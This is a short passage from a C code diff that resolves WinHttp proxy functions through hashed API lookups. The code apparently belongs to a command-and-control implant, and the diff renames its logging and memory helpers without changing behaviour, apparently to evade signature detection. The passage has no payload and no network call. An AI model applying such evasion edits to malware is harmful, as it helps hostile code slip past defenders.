         Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER );
         Instance->Win32.WinHttpGetProxyForUrl                 = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPGETPROXYFORURL );
 
-        PUTS( "Loaded WinHttp functions" )
+        STUP( "Loaded WinHttp functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load WinHttp" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load WinHttp" )
         return FALSE;
     }
 
